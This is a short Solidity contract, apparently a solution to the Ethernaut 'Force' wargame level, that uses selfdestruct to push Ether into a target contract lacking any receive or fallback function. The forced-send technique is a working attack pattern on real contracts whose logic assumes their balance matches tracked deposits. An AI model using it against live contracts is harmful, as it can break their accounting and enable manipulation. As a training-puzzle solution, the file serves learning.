// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Minimal attacker for the Ethernaut Force level.
contract ForceAttacker {
    constructor() payable {}

    // Send balance via selfdestruct to bypass receive/fallback absence.
    function attack(address payable target) external {
        selfdestruct(target);
    }
}
